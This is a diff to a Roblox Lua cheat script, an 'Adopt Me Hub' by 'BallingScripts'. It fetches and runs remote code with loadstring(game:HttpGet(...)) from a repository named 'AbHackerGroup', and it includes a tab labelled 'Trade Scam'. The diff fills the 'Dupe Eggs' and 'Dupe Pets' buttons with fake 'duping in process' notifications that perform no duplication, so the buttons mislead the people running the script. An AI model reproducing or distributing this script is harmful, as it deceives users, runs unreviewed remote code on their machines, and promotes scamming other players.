@@ -2,9 +2,9 @@ local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shl
 local Window = OrionLib:MakeWindow({Name = "Balling Scripts | Adopt Me Hub [3.5]❗", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 OrionLib:MakeNotification({
 	Name = "Loading Script...",
-	Content = "Script will be loaded in 15-20 seconds",
+	Content = "Script will be loaded in 25-30 seconds",
 	Image = "rbxassetid://4483345998",
-	Time = 10
+	Time = 45
 })
 
 --[[
@@ -15,6 +15,14 @@ Time = <number> - The duration of the notfication.
 ]]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AbHackerGroup/BallingScriptsAdoptMe/main/Adoptme-MainHub-%5BBallingScripts%5D"))()
 --[[
+
+
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
 Name = <string> - The name of the UI.
 HidePremium = <bool> - Whether or not the user details shows Premium status or not.
 SaveConfig = <bool> - Toggles the config saving in the UI.
@@ -59,12 +67,25 @@ Time = <number> - The duration of the notfication.
 
 Tab:AddButton({
 	Name = "Click To Dupe Eggs",
-	Callback = function()	
-  	end    
+	Callback = function()
+OrionLib:MakeNotification({
+	Name = "Duping Eggs....",
+	Content = "Duping is in process..[Takes around 1-2 minute]",
+	Image = "rbxassetid://4483345998",
+	Time = 50
 })
 
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+  	end    
+})
+Tab:AddParagraph("READ❗","The Feature - Dupe Eggs - Will Not Work if ur in a private server")
 Tab:AddParagraph("Script Successfully Loaded❗","Thank u for waiting")
-Tab:AddParagraph("READ❗","DUPE FUNCTIONS WILL NOT WORK IF UR IN A PRIVATE SERVER")
+
 local Tab = Window:MakeTab({
     Name = "Trade Scam🙈",
     Icon = "rbxassetid://4483345998",
@@ -181,11 +202,24 @@ Time = <number> - The duration of the notfication.
 Tab:AddButton({
 	Name = "Click To Dupe Pets",
 	Callback = function()
-  	end    
+	OrionLib:MakeNotification({
+	Name = "Duping Pets...",
+	Content = "Duping in Process..[Takes Around 1-2 minutes]",
+	Image = "rbxassetid://4483345998",
+	Time = 5
 })
 
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+  	end    
+})
+Tab:AddParagraph("READ❗","The Feature - Dupe Eggs - Will Not Work if ur in a private server")
 Tab:AddParagraph("Script Successfully Loaded❗","Thank u for waiting")
-Tab:AddParagraph("READ❗","DUPE FUNCTIONS WILL NOT WORK IF UR IN A PRIVATE SERVER")
+
 --[[
 Name = <string> - The name of the button.
 Callback = <function> - The function of the button.
@@ -275,7 +309,7 @@ Tab:AddParagraph("Script Successfully Loaded❗","Thank u for waiting")
 
 
 local Tab = Window:MakeTab({
-    Name = "Credits | Discord 👥 ",
+    Name = "INFO | DISCORD🥤 ",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
@@ -285,7 +319,18 @@ Name = <string> - The name of the tab.
 Icon = <string> - The icon of the tab.
 PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 ]]
+Tab:AddParagraph("My Discord server","Join my discord if u need anything❗")
+Tab:AddButton({
+	Name = "Copy Link To Discord Server 🎯",
+	Callback = function()
+    setclipboard("https://discord.com/invite/SASw2jSRkS")
+      		print("button pressed")
+  	end    
+})
 
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
 Tab:AddParagraph("CREDITS❗","Made By BallingScripts")
 Tab:AddParagraph("Script Successfully Loaded❗","Thank u for waiting")
-Tab:AddParagraph("READ❗","SOME FEATURES WILL NOT WORK IF UR IN A PRIVATE SERVER THIS IS BECAUSE OF LACK OF PLAYER FUNCTIONS")
